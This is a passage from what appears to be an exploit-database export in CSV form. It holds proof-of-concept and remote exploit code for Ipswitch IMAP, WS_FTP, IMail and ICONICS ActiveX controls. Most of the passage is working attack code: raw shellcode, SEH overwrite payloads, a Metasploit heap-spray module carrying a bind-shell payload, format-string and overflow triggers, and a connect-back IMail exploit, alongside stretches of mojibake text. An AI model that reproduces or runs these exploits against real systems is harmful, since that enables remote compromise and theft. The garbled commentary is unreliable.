""\xd1\xa9\x93\xab\x8d\x38\x08\x1a\x37\xba\xb5\x42\x98\x59\x16""
""\xed\x83\xe9\x76\x84\x38\x74\x05\x46\xcd\x46\xd9\xf2\x11\xd4""
""\x29\xcb\x25\x6a\x7a\x1b\xb2\xab\x5b\x7b\x15\xea\xdf\x3f\x49""
""\xca\xf9\x9f\xe7\x77\x72\xc0\x9b\x18\x19\x61\x08\x81\xaf\x0e""
""\xa5\x3d\x70\x90\x21\xd0\x19\x7c\xc3\x59\xae\xf2\x72\xe9\x21""
""\x81\x07\x31\xcc\x55\xd8\x45\x10\xb9\x59\xe1\x14\xc5\x53"";
char *seh = ""\xC4\x2A\x02\x75"";
char *nextseh = ""\xeb\x10\x90\x90"";
int main(int argc, char *argv[])
SOCKET s;
struct fd_set mask;
struct timeval timeout;
struct sockaddr_in server;
char user[20], pass[20];
char payload[2048];
char recvbuf[1024];
if(argc < 4)
usage();
return 0;
if((strlen(argv[3])<15) && (strlen(argv[4])<15))
strncpy(user, argv[3], 14);
strncpy(pass, argv[4], 14);
user[14] = '\0';
pass[14] = '\0';
else {
usage();
return 0;
int ipaddr=htonl(inet_addr(argv[1])), port=atoi(argv[2]);;
fprintf(stderr, ""Ipsbitch vs Ipswitch IMAP <=v9.20\n(C) dmc <dmc@deadbeef.co.uk>\n\n"");
char auth[50];
memset(auth, 0, sizeof(auth));
memset(recvbuf, 0, sizeof(recvbuf));
strcat(auth, ""0 LOGIN "");
strcat(auth, user);
strcat(auth, "" "");
strcat(auth, pass);
strcat(auth, ""\r\n"");
strcat(auth, ""\0"");
memset(payload, 0, sizeof(payload));
strcat(payload, ""2 SEARCH BEFORE "");
for(int i=0; i<80; i++) strcat(payload, ""\x90"");
strcat(payload, nextseh);
strcat(payload, seh);
for(int i=0; i<100; i++) strcat(payload, ""\x90"");
strcat(payload, shellcode);
for(int i=0; i<300; i++) strcat(payload, ""\x90"");
strcat(payload, ""\r\n"");
WSADATA info;
if (WSAStartup(MAKEWORD(2,0), &info)) error(""Unable to start WSA"");
s=socket(AF_INET,SOCK_STREAM,0);
if (s==INVALID_SOCKET) error(""[*] socket error"");
server.sin_family=AF_INET;
server.sin_addr.s_addr=htonl(ipaddr);
server.sin_port=htons(port);
WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
select(s+1,NULL,&mask,NULL,&timeout);
if(FD_ISSET(s,&mask))
fprintf(stderr, ""[*] Connecting to IMAP server\n"");
Sleep(1000);recv(s,recvbuf,200,0);
fprintf(stderr, ""[*] Got banner:\n%s\n"", recvbuf);
memset(recvbuf, 0, sizeof(recvbuf));
fprintf(stderr, ""[*] Authenticating...\n"");
if (send(s,auth,strlen(auth),0)==SOCKET_ERROR) error(""[*] error sending auth payload"");
memset(auth, 0, sizeof(auth));
Sleep(1000);recv(s,recvbuf,200,0);
fprintf(stderr, ""[*] Received:\n%s\n"", recvbuf);
memset(recvbuf, 0, sizeof(recvbuf));
fprintf(stderr, ""[*] Sending SELECT command...\n"");
if (send(s,""1 SELECT INBOX\r\n"",strlen(""1 SELECT INBOX\r\n""),0)==SOCKET_ERROR) error(""[*] error sending auth payload"");
Sleep(1000);recv(s,recvbuf,200,0);
fprintf(stderr, ""[*] Received:\n%s\n"", recvbuf);
memset(recvbuf, 0, sizeof(recvbuf));
Sleep(1000);recv(s,recvbuf,200,0);
fprintf(stderr, ""[*] Received:\n%s\n"", recvbuf);
fprintf(stderr, ""[*] Sending exploit payload...\n"");
if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) error(""[*] error sending exploit payload"");
memset(payload, 0, sizeof(payload));
fprintf(stderr, ""[*] Now try USER=r00t PASS=r00tr00t!!\n"");
return 0;"
2009-09-09,DoS,Windows,Jeremy Brown,Ipswitch WS_FTP 12 Professional,Remote Format String (PoC),"#!/usr/bin/perl
# nocoolnameforawsftppoc.pl
# AKA
# Ipswitch WS_FTP 12 Professional Remote Format String 0day PoC
# Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 09.07.2009
# *********************************************************************************************************
# I really _hate_ releasing proof of concepts. ASCII gets itchy after a few months. And it has been over a
# year since a WS_FTP exploit/PoC has been on milw0rm (as far as I know) (!). Crazy right? This bug was
# found with Hzzp, yes WS_FTP parses HTTP too. Format string in the status code, bang bang. But the problem
# is we can't seem to be able to use %n, which I believe is disabled by default per Microsoft, making
# exploitation more difficult. Hrm. And where is a security contact for Ipswitch? I believe I did try to
# find a reasonable resource. Maybe Ipswitch should just fuzz their products with Hzzp? xD Happy Holidays!
# **********************************************************************************************************
# nocoolnameforawsftppoc.pl
# milw0rm.com [2009-09-09]","use IO::Socket;
$port    = 80;
$payload = ""HTTP/1.1 %s%s\r\n\r\n"";
$serv = IO::Socket::INET->new(Proto=>'tcp', LocalPort=>$port, Listen=>1) or die ""Error: listen($port)\n"";
$cli = $serv->accept() or die ""Error: accept()\n"";
$cli->recv($buf, 512);
$cli->send($payload);
close($cli);
close($serv);"
2008-09-25,Remote,Windows,Kevin Finisterre,ICONICS Vessel / Gauge / Switch 8.02.140,ActiveX Buffer Overflow (Metasploit),"# $Id: iconics_dlgwrapper.rb 1 2008-09-21 22:43:00Z kf $
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
# $ msfcli exploit/windows/browser/iconics_dlgwrapper RHOST=10.211.55.6 PAYLOAD=windows/shell_bind_tcp E
# This most likely works with Switch and Gauge ActiveX controls as well
# Thanks for the target testing tebo. Verified on 2kSP4, XPSP0, XPSP2, XPSP3
# Re-generate the payload
# Encode the shellcode
# Randomize the javascript variable names
// begin skylined technique - use the common MSF randomized version.
#{rand8} = #{rand8} + unescape(""%0c%0c%0c%0c""); // Return address for the heap sprayed nop sled
#{targetname}.DoModal(#{rand8},""#{rand9}"");   // Trigger line
# milw0rm.com [2008-09-25]","require 'msf/core'
module Msf
class Exploits::Windows::Browser::Iconics_Dlgwrapper < Msf::Exploit::Remote
include Exploit::Remote::HttpServer::HTML
def initialize(info = {})
super(update_info(info,
'Name'           => 'ICONICS Vessel / Gauge / Switch 8.02.140 ActiveX DoModal Overflow',
'Description'    => %q{
This module exploits a stack overflow in the Iconics Vessel / Gauge / Switch ActiveX controls
'License'        => MSF_LICENSE,
'Author'         => [ 'tebo', 'kf' ],
'Version'        => '$Revision: 2 $',
'References'     =>
[ 'URL', 'http://www.kb.cert.org/vuls/id/251969' ],
[ 'URL', 'https://www.securityfocus.com/bid/21849/info' ],
[ 'URL', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6488' ],
[ 'URL', 'http://www.iconics.com/support/free_tools/FreeToolsActiveX_DlgWrapperHotFix.zip' ],
'DefaultOptions' =>
'EXITFUNC' => 'thread',
'Payload'        =>
'BadChars'      => ""\x00"",
'StackAdjustment' => -3500,
'Platform'       => 'win',
'Targets'        =>
[ 'ICONICS Vessel ActiveX 8.02.140 - Universal EIP hit', { 'Payload' => { 'Space' => 412 } } ],
'DisclosureDate' => 'Jan 10 2007',
'DefaultTarget'  => 0))
end
def on_request_uri(cli, request)
return if ((p = regenerate_payload(cli)) == nil)
shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
var_i  = rand_text_alpha(rand(30)  + 2)
rand1  = rand_text_alpha(rand(100) + 1)
rand2  = rand_text_alpha(rand(100) + 1)
rand3  = rand_text_alpha(rand(100) + 1)
rand4  = rand_text_alpha(rand(100) + 1)
rand5  = rand_text_alpha(rand(100) + 1)
rand6  = rand_text_alpha(rand(100) + 1)
rand7  = rand_text_alpha(rand(100) + 1)
rand8  = rand_text_alpha(rand(100) + 1)
rand9  = rand_text_alpha(rand(100) + 1)
rand10 = Rex::Text.to_unescape(rand_text_alpha(1), Rex::Arch.endian(target.arch))
idname= ""DlgWrapper""
targetname= rand_text_alpha(rand(100) + 1)
content = %Q|
<html>
<object classid='clsid:9d6bd878-b8eb-47e5-ab1c-87d74173baa' id='#{idname}'></object>
<script language='javascript'>
var #{rand1} = unescape('#{shellcode}');
var #{rand2} = unescape(""%u0d0d%u0d0d"");// unicode nops....
var #{rand3} = 20;
var #{rand4} = #{rand3} + #{rand1}.length;
while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
var #{rand5} = #{rand2}.substring(0,#{rand4});
var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
var #{rand7} = new Array();
for (#{var_i} = 0; #{var_i} < 500; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} };
var #{rand8} = """";
for (#{var_i} = 0; #{var_i} < #{payload_space}; #{var_i}++) { #{rand8} = #{rand8} + unescape(""#{rand10}"") };
var #{targetname} = new ActiveXObject(""#{idname}.BrowseFile.1"");
</script>
</html>
print_status(""Note: The free ActiveX Controls (Gauge, Switch & Vessel) have a hotfix available."")
print_status(""Sending exploit to #{cli.peerhost}:#{cli.peerport}..."")
send_response_html(cli, content)
handler(cli)
end
end
end"
2008-08-17,DoS,Windows,securfrog,Ipswitch WS_FTP Home/Professional FTP Client,Remote Format String (PoC),"# Ipswitch WS_FTP Home/WS_FTP Professional FTP Client Remote Format String vulnerability
# Vendor : http://www.ipswitch.com/
# Affected Os : Windows *
# Risk : critical
# This bug is pretty interresting in the way you have to exploit it in a weird way...
# With this PoC you'll get a full control over EAX/ECX
# (
# eax=41414141 ebx=0000000a ecx=41414141 edx=00000000 esi=41414142 edi=02b1f0ab
# eip=77d3ef68 esp=02b1f01c ebp=02b1f064 iopl=0         nv up ei pl nz na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
# USER32!CharLowerA+0x93:
# 77d3ef68 8a10             mov     dl,[eax]                ds:0023:41414141=??
# )
# Fake Server PoC :
# Anyways, in the WS_FTP Home client there's still a buffer overflow in the FTP server message response ( 4100 chars answer --> done ).
# milw0rm.com [2008-08-17]","use strict;
use Socket;
my $port = shift || 21;
my $proto = getprotobyname('tcp');
my $goodz = ""\x41\x41\x41\x41\x41\x41\x41\x41%x%x%x%x%x%x%x%s"";
my $visitor;
socket(SOCKET, PF_INET, SOCK_STREAM, $proto)
or die ""To bad $!\n"";
setsockopt(SOCKET, SOL_SOCKET, SO_REUSEADDR, 1);
bind(SOCKET, pack( ""S n a4 x8"", AF_INET, $port, ""\0\0\0\0"" ))
or die ""Shitz port $port is allready in use, shut down your ftp server !\n"";
listen(SOCKET, 5) or die ""Listen: $!"";
print ""Fake Server started on port $port\n"";
while ($visitor = accept(NEW_SOCKET, SOCKET)) {
print NEW_SOCKET $goodz;
close NEW_SOCKET;"
2008-02-03,DoS,Windows,securfrog,Ipswitch WS_FTP Server with SSH 6.1.0.0,Remote Buffer Overflow (PoC),"# IpSwitch WS_FTPSERVER with SSH remote Buffer Overflow
# Website:http://www.wsftp.com/products/ws_ftp_server/
# Version:6.1.0.0 ( last one,others might be vuln too )
# Bug: Remote Buffer Overflow ( CD)
# (8e8.a78): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000000 ebx=00000000 ecx=00410041 edx=7c9137d8 esi=00000000 edi=00000000
# eip=00410041 esp=04b8c830 ebp=04b8c850 iopl=0         nv up ei pl zr na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
# 00410041 ??               ???
#Here's the PoC :
# milw0rm.com [2008-02-03]","use strict;
use Net::SSH2;
my $ip=""127.0.0.1"";
my $port=22;
my $user=""USERNAME"";
my $pass=""PASSWORD"";
my $ssh2 = Net::SSH2->new();
my $payload =""A"" x 5131;
$ssh2->connect($ip, $port) || die ""could not connect"";
$ssh2->auth_password($user,$pass)|| die ""wrong passwd/login"";
print ""Poc running ...\n"";
my $sftp = $ssh2->sftp
my $dir = $sftp->opendir($payload);
print ""Buffer Overflow Successfull\n"";
$ssh2->disconnect();
exit;"
2007-09-21,Remote,Windows,axis,IPSwitch IMail Server 8.0x,Remote Heap Overflow,"http://www.ph4nt0m.org
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock.h>
#include <io.h>
#pragma comment (lib,""ws2_32"")
//#define  SCaddr  ""\x50\xe7\x03\x10""
#define  SCaddr  ""\x50\xc8\xfd\x7f""
#define  Fuck_ptr ""\x6c\x54\x03\x10""   //0x1003546c
#define  Teb_temp1  0x7ffdd050
#define  Teb_temp2  0x7ffdd040
#define  Teb_temp3  0x7ffdd030
#define PROC_BEGIN __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90\
#define PROC_END PROC_BEGIN
// kernel32.dll functions index
#define _LoadLibraryA0x00
#define _CreateProcessA0x04
//#define _ExitProcess0x08
#define _ExitThread 0x08
#define_WaitForSingleObject0x0C
// ws2_32.dll functions index
#define _WSASocketA0x10
#define _connect0x14
#define _closesocket0x18
//#define _WSAStartup0x1C
// functions number
#define _Knums                  4
#define _Wnums                  3
// Need functions
// kernel32 4                           // 00 kernel32.dll
//{""ExitProcess""},
//{""TerminateProcess""},
// ws2_32  3                            // 01 ws2_32.dll
//{""WSAStartup""},                       //    [esi+28]
// Get function hash
// get shellcode
// Get functions hash
//fprintf(stderr, ""%.8X\t%s\n"", dwHash[i], functions[i]);
// Deal with shellcode
// Add functions hash
//printf(""%d bytes shellcode\n"", sh_Len);
// print shellcode
//PrintSc(pSc_Buff, sh_Len);
// find xor byte
//                   ((pSc_Buff[j] ^ i) == 0x26) ||    //%
//                   ((pSc_Buff[j] ^ i) == 0x3d) ||    //=
//               ((pSc_Buff[j] ^ i) == 0x3f) ||    //?
//((pSc_Buff[j] ^ i) == 0x40) ||    //@
//((pSc_Buff[j] ^ i) == 0x3c) ||
//((pSc_Buff[j] ^ i) == 0x3e) ||
//   ((pSc_Buff[j] ^ i) == 0x2f) ||
//   ((pSc_Buff[j] ^ i) == 0x22) ||
//   ((pSc_Buff[j] ^ i) == 0x2a) ||
//((pSc_Buff[j] ^ i) == 0x3a) ||
//   ((pSc_Buff[j] ^ i) == 0x20) ||
//               ((pSc_Buff[j] ^ i) == 0x5C)
//printf(""Find XOR Byte: 0x%02X\n"", i);
// No xor byte found
//fprintf(stderr, ""No xor byte found!\n"");
//fprintf(stderr, ""Xor byte 0x%02X\n"", Enc_key);
// encode
// print shellcode
// ShellCode function
// Get kernel32.dll base addr
// Get function addr of kernel32
// Get ws2_32.dll base addr
//mov     ebp, eax                   // ebp = ws2_32.dll base address
// Get function addr of ws2_32
//LWSAStartup:
//LWSASocketA:
//mov     ebx, eax                    // socket -> ebx
//Lconnect:
//int 3
// if connect failed , exit
//        xor     eax, eax
// allot memory for STARTUPINFO, PROCESS_INFORMATION
// zero out SI/PI
//mov     byte ptr [esp+0x10], 0x44   // si.cb = sizeof(si)
//inc     byte ptr [esp+0x3C]         // si.dwFlags
//inc     byte ptr [esp+0x3D]         // si.wShowWindow
//mov     [esp+0x48], ebx             // si.hStdInput = s
//mov     [esp+0x4C], ebx             // si.hStdOutput = s
//mov     [esp+0x50], ebx             // si.hStdError = s
// push ""cmd""
//LCreateProcess:
//LWaitForSingleObject:
//push    1
//LCloseSocket:
//push    ebx
// Â»Ã–Å¾Å½Â¹Â¹Ã”Ã¬ÂµÃ„Ã’Ã§Â³Ã¶ÂµÃ£
//push    1
//call    dword ptr [esi+_ExitProcess]            // ExitProcess();
// AddressOfNameOrdinals RVA
// ripped from isno
// HELO
//printf(""%s"", buffer);
// MAIL FROM
// RCPT TO
// DATA
// TIME
//recv(s, buffer, sizeof(buffer), 0);
//printf(""%s"", buffer);
// Ã…ÃÂ¶ÃÃŠÃ‡ÂµÃšÅ’Å¾Â·Ã¢Ã“ÃŠÅ’Ã¾
//memcpy(payload+strlen(const char *szCT), ""\"""", 1);
//straddr1
//straddr2   0x10036ea0
// MIME
//recv(s, buffer, sizeof(buffer), 0);
//printf(""%s"", buffer);
//     printf(""[+]Fucking Server at %s.\n"", szTIME);
// memset(buffer, 0, sizeof(buffer));
//print $sock ""Content-Transfer-Encoding:$padding2\r\n"";
//memcpy(padding, ""\x43"", 80);
//memcpy(payload+strlen(const char *szCT), ""\"""", 1);
//straddr1
//straddr2   0x10036ea0
// MIME
//recv(s, buffer, sizeof(buffer), 0);
//printf(""%s"", buffer);
//     printf(""[+]Fucking Server at %s.\n"", szTIME);
// memset(buffer, 0, sizeof(buffer));
//print $sock ""Content-Transfer-Encoding:$padding2\r\n"";
//memcpy(padding, ""\x43"", 80);
// send payload  Â¹Â¹Ã”Ã¬Ã’Ã§Â³Ã¶ÂµÃ„Ã—Ã–Â·Ã»Å½Â®  eipÃ–Å¾ÃÃ²shellcodeÂµÃ„ÂµÃ˜Ã–Â·
//memcpy(payload+strlen(const char *szCT), ""\"""", 1);
//straddr1
//straddr2   0x7ffdc850
// MIME
//recv(s, buffer, sizeof(buffer), 0);
//printf(""%s"", buffer);
//     printf(""[+]Fucking Server at %s.\n"", szTIME);
// memset(buffer, 0, sizeof(buffer));
//print $sock ""Content-Transfer-Encoding:$padding2\r\n"";
//memcpy(padding, ""\x43"", 80);
// Â·Â¢Ã‹ÃshellcodeÂ¹Ã½ÃˆÂ¥Â±Â£Å½Ã¦
//memcpy(payload+strlen(const char *szCT), ""\"""", 1);
//straddr1
//straddr2  Å½Â¥Â·Â¢Ã’Ã§Â³Ã¶ÂµÃ„ÂµÃ˜Ã–Â·
// MIME
//recv(s, buffer, sizeof(buffer), 0);
//printf(""%s"", buffer);
//     printf(""[+]Fucking Server at %s.\n"", szTIME);
// memset(buffer, 0, sizeof(buffer));
//print $sock ""Content-Transfer-Encoding:$padding2\r\n"";
//memcpy(padding, ""\x43"", 80);
// send payload  ÃÃžÅ¾Ã„Ã–Å¾Ã•Ã«ÂµÃ˜Ã–Â·Â£Â¬Â¹Â¹Ã”Ã¬Â³Ã¶Ã’Ã§Â³Ã¶
// ÃÃ¨Ã’ÂªÃ–Å¾ÃÃ²Â¹Â¹Ã”Ã¬Ã’Ã§Â³Ã¶Ã—Ã–Â·Ã»Å½Â®ÂµÃ„ÂµÃ˜Ã–Â·Â£Â¬Ã’Ã”Å’Â°2Å¾Ã¶Â¿Ã‰ÃÅ½ÂµÃ˜Ã–Â·
// END
// QUIT
//printf(""%s"", buffer);
//int  imail_ver = 0;    //imail version  (bufferÂ²Â»ÃÂ¬)
//int  ret;
//SOCKET  s;
//WSADATA WSAData;
//printf(""shellcode length is: %d \n"",strlen((char *)sh_Buff));
//PrintSc(sh_Buff, sh_Len);
//printf(""[+]Now Sending the %d fucking Mail!\n"",mail_payload+1);
// milw0rm.com [2007-09-21]","by axis
2007-06-05
Mail-List: http://list.ph4nt0m.org
Ã’Ã”Ã‡Â°Ã“ÃÃ•Ã¢Å¾Ã¶Ã’Â»Å¾Ã¶imailÂµÃ„exp
PRIVATE Remote Exploit  For IMAIL Smtp Server(1.2)
This is For imail 8.01-8.11 version
Usage:faint.exe -d <host> [options]
Options:
-d:             Hostname to attack [Required]
-t:             Type [Default: 0]
-p:             Attack port [Default: 25]
-S:             the IP connect back to.
-P:             the port connect back to.
Types:
0: win2k All version , IMail 8.01-11
Â²Â»Ã–ÂªÂµÃ€ÃŠÃ‡Ã„Ã„ÃŽÂ»Å½Ã³Ã…Â£ÃÅ½ÂµÃ„
Ã—Ã®Å“Ã¼Â¿Å½ÃÃ‹Â¿Å½Â£Â¬
Â·Ã‡Â³Â£ÂºÃƒÃÃ¦ÂµÃ„Ã’Â»Å¾Ã¶Ã‚Â©Â¶Å½Â¡Â£
Ã‚Â©Â¶Å½ÃŠÃ‡Â·Â¢Ã‰ÃºÃ”Ãšiaspam.dllÃ€Ã¯
loc_1001ada5       ==> Ã—Â¢Ã’Ã¢Â¶Â¯ÃŒÂ¬ÂµÃ·ÃŠÃ”ÃŠÂ±ÂºÃ²Ã—Â¢Ã’Ã¢Å’Ã“Ã”Ã˜Â»Ã¹Ã–Â·ÂµÃ„Â²Â»ÃÂ¬Â¡Â£
mov    eax, [ebp+var_54]
mov    ecx, [eax+10c8h]
push   ecx                 ; char *
mov    edx, [ebp+var_54]
mov    eax, [edx+10d0h]
push   eax                 ; char *
call   _strcpy
add    esp, 8
jmp    loc_1001a6f0
Ã•Ã¢Ã€Ã¯strcpyÂµÃ„ÃÅ“Å¾Ã¶bufferÂ£Â¬srcÂºÃdstÂµÃ„Ã–Å¾Ã•Ã«Â£Â¬Å¸Ã“ÃˆÂ»ÃŠÃ‡Ã–Â±Å“Ã“Å½Ã“Â¶Ã‘Ã€Ã¯Â¶ÃÂ³Ã¶Ã€Å½ÂµÃ„Â¡Â£
Â¶Ã¸Ã–Â®Ã‡Â°ÃƒÂ»Ã“ÃÃ—Ã¶ÃˆÃŽÂºÃŽÅ’Ã¬Â²Ã©
Ã‹Ã¹Ã’Ã”Â·Â¢Ã‹ÃÅ¾Ã¶Ã“ÃŠÅ’Ã¾ÂµÅ“Â·Ã¾ÃŽÃ±Ã†Ã·Â£Â¬SMDÃŽÃ„Å’Ã¾
ÃˆÂ»ÂºÃ³Ã”ÃšÃ†Ã¤ÂºÃ³ÂµÃ„Ã†Â«Ã’Ã†Å½Å Â¿Ã˜Ã–Ã†Ã•Ã¢ÃÅ“Å¾Ã¶ÂµÃ˜Ã–Â·Â£Â¬Å¸ÃÂ¿Ã‰Ã’Ã”Â¿Å“Â±Å½ÃˆÃŽÃ’Ã¢Ã—Ã–Â·Ã»Å½Â®ÂµÅ“ÃˆÃŽÃ’Ã¢Ã„ÃšÅ½Ã¦Â¡Â£
badcharÃŠÃ‡ 0x00 0x0a  emmÃ‹ÂµÂ»Â¹Ã“ÃÅ¾Ã¶ 0x25,Â²Â»Â¹Ã½ÃŽÃ’ÃƒÂ»Ã•Ã’ÂµÅ“Â¡Â£
Ã’Ã”Ã‡Â°ÃÃ¸Ã‰ÃÃ„Ã‡Å¾Ã¶Â·Å½ÃÂ¬ÂµÃ„Â°Ã¦Â±Å¸Â£Â¬ÃŠÃ‡Ã€Ã»Ã“ÃƒÃÃ‹Å¾Â²Å¾Ã‡pebÃ€Ã¯ÂµÃ„Ã–Å¾Ã•Ã«Â¡Â£
Ã•Ã¢Ã–Ã–Â·Å“Â·Å¡Ã”Ãš2003Ã‰ÃÂ²Â»Ã„ÃœÃ“ÃƒÂ¡Â£
Ã•Ã¢Ã€Ã¯ÃŽÃ’Â²Ã‰Ã“ÃƒÃÃ‹emmÂµÃ„Â·Å“Â·Å¡Â£Â¬Â¹Â¹Ã”Ã¬ÃÃ‹Ã’Â»Å¾Ã¶Ã’Ã§Â³Ã¶
Ã’Ã²ÃŽÂªimailsec.dllÂµÃ„.dataÂ¶ÃŽÂ¿Ã‰ÃÅ½Â¡Â£
Ã‹Ã¹Ã’Ã”ÃŽÃ’Ã•Ã’ÂµÅ“ÃÃ‹Ã•Ã¢ÃƒÅ½Ã’Â»Å¾Ã¶ÂµÃ˜Â·Å“
1000CB5D    8B45 08         MOV EAX,DWORD PTR SS:[EBP+8]
1000CB60    50              PUSH EAX
1000CB61    8B0D 6C540310   MOV ECX,DWORD PTR DS:[1003546C]          ; IMailsec.1003549C
1000CB67    51              PUSH ECX
1000CB68    8D95 FCFDFFFF   LEA EDX,DWORD PTR SS:[EBP-204]
1000CB6E    52              PUSH EDX
1000CB6F    FF15 F8D30210   CALL DWORD PTR DS:[<&USER32.wsprintfA>]  ; USER32.wsprintfA
Ã†Ã¤Ã–ÃÃ–Å¾Ã•Ã«DWORD PTR DS:[1003546C] Ã”Ãšimailsec.dllÂµÃ„.dataÃ–ÃÂ£Â¬Ã•Ã¢Å¾Ã¶ÂµÃ˜Ã–Â·Â¿Ã‰Ã’Ã”Â±Â»ÃŽÃ’ÃƒÃ‡Å¾Â²Å¾Ã‡Â¡Â£
Ã‹Ã¹Ã’Ã”ÃŽÃ’ÃƒÃ‡Å¸ÃÂ¿Ã‰Ã’Ã”Â¹Â¹Ã”Ã¬Ã’Â»Å¾Ã¶Ã’Ã§Â³Ã¶Â¡Â£
Ã‹Å’Ã‚Â·ÃˆÃ§ÃÃ‚Â£Âº
ÂµÃšÃ’Â»Â·Ã¢Ã“ÃŠÅ’Ã¾Â£Âº Â·Â¢Ã‹ÃshellcodeÂµÅ“Ã„ÃšÅ½Ã¦Ã–ÃÂ±Â£Å½Ã¦ÂºÃƒÂ¡Â£Ã•Ã¢Ã€Ã¯ÃŽÃ’Â·Ã…ÂµÅ“ÃÃ‹tebÃ–Ã
ÂµÃšÂ¶Ã¾Â·Ã¢Ã“ÃŠÅ’Ã¾Â£Âº Â·Â¢Ã‹ÃÃ’Ã§Â³Ã¶ÃÃ¨Ã’ÂªÂµÃ„Å¾Â²Å¾Ã‡Ã—Ã–Â·Ã»Å½Â®ÂµÅ“Ã„ÃšÅ½Ã¦Ã–ÃÂ±Â£Å½Ã¦ÂºÃƒÂ¡Â£Ã•Ã¢Ã€Ã¯ÃŽÃ’Ã’Â²Â·Ã…Ã”ÃšÃÃ‹tebÃ–Ã
ÂµÃšÃˆÃ½Â·Ã¢Ã“ÃŠÅ’Ã¾Â£Âº Å¾Â²Å¾Ã‡imailsec.dllÃ–ÃÂµÃ„ .dataÂ¶ÃŽÂµÃ„Ã–Å¾Ã•Ã«Â£Â¬ÃŠÂ¹wsprintfAÃ”Ã¬Â³Ã‰Ã’Ã§Â³Ã¶
Ã’Ã§Â³Ã¶Å¾Â²Å¾Ã‡ÃŠÂ¹Ã“ÃƒÂµÃ„Ã—Ã–Â·Ã»Å½Â®ÃŠÃ‡ÂµÃšÂ¶Ã¾Â·Ã¢Ã“ÃŠÅ’Ã¾Â·Â¢Ã‹ÃÂ¹Ã½ÃˆÂ¥ÂµÃ„Â£Â¬Å¾Â²Å¾Ã‡ÂºÃ³ÂµÃ„Â·ÂµÂ»Ã˜ÂµÃ˜Ã–Â·Ã–Â±Å“Ã“Ã–Å¾ÃÃ²ÃÃ‹ÂµÃšÃ’Â»Â·Ã¢Ã“ÃŠÅ’Ã¾Â·Â¢Ã‹ÃÂ¹Ã½ÃˆÂ¥ÂµÃ„shellcodeÃ”ÃšÃ„ÃšÅ½Ã¦Ã–ÃÂµÃ„ÂµÃ˜Ã–Â·Â¡Â£
Ã‹Ã¹Ã’Ã”Ã•Ã¢Å¾Ã¶Ã‚Â©Â¶Å½ÃŠÃ‡ÂºÃÃ†Å“ÃŒÅ¡ÃŽÃžÂ¹Ã˜ÂµÃ„Â£Â¡Â£Â¡Â²Â»ÃÃ¨Ã’ÂªÃˆÃŽÂºÃŽopcodeÂ£Â¡Â£Â¡
Ã”ÃšÃŠÂµÅ’ÃŠÃ€Ã»Ã“ÃƒÃŠÂ±ÃŽÃ’Â·Â¢Ã‹ÃÃÃ‹4Â·Ã¢Ã“ÃŠÅ’Ã¾Â£Â¬ÂµÃšÃ’Â»Â·Ã¢ÃŠÃ‡Â·ÃÃ“ÃŠÅ’Ã¾Â£Â¬Ã“ÃƒÃ“ÃšÃŒÃ¡Å¾ÃŸÂ³Ã‰Â¹Å Ã‚ÃŠÂ¡Â£
Ã“Ã‰Ã“ÃšÂ»Â¥ÃÂªÃÃ¸ÂµÃ„spamÂ·ÂºÃ€Ã„Â£Â¬Ã‹Ã¹Ã’Ã”ÂµÃˆÂµÅ“Ã“ÃŠÅ’Ã¾Â·Ã¾ÃŽÃ±Ã†Ã·Å½Å Ã€Ã­Ã‚Â©Â¶Å½Ã“ÃŠÅ’Ã¾ÃŠÂ±Â£Â¬Ã’Â²ÃÃ­Ã’Ã‘Å¸Â­Â¹Ã½ÃÃ‹Å’Å¾Å¾Ã¶Ã”Ã‚ÃÃ‹Â¡Â£Â¡Â£Â¡Â£
Ã‹Ã¹Ã’Ã”Ã—Ã®ÂºÃƒÂµÃ„Â·Å“Â°Å¾ÃŠÃ‡ÃŠÂ¹Ã“Ãƒdownload+exec ÂµÃ„shellcodeÂ¡Â£
Ã•Ã¢Ã€Ã¯Å¾Ã¸Â³Ã¶Ã’Â»Å¾Ã¶Â±ÃˆÅ“ÃÃ€ÃƒÂµÃ„Â·Å½ÃÂ¬shellcodeÃ—Ã·ÃŽÂªpocÂ¡Â£
Å¸ÃemmÃ‹ÂµÃ•Ã¢Å¾Ã¶Ã‚Â©Â¶Å½Ã’Â»Ã–Â±ÃƒÂ»Â²Â¹Â£Â¬Ã–Â»ÃŠÃ‡Å¾ÃŸÂ°Ã¦Â±Å¸ÃƒÂ»Ã“ÃÃÃ‹Â¡Â£Â¡Â£Â¡Â£
char *szEHLO = ""HELO\r\n"";
char *szMF = ""MAIL FROM <fucker@fuckimail.org>\r\n"";
char *szRCPT = ""RCPT TO: <postmaster>\r\n"";
char *szDATA = ""DATA\r\n"";
char *szTIME = ""Date: Thu, 1 Oct 2007 07:06:09 +0800\r\n"";
char *szMIME = ""MIME\r\n"";
char *szEND = "".\r\n"";
char *szQUIT = ""QUIT\r\n"";
char *szCT = ""Content-Type: multipart/boundary="";
char *szCTE = ""Content-Transfer-Encoding:"";
unsigned short port = 25;
unsigned char payload[5000] = """";
__asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90
unsigned char sh_Buff[2048];
unsigned int  sh_Len;
unsigned int  Enc_key=0x99;        //Ã†Ã¤ÃŠÂµÃŽÃžÂ¹Ã˜Å“Ã´Ã’Âª,Â¶Â¯ÃŒÂ¬Ã‘Â°Ã•Ã’
unsigned char decode1[] =
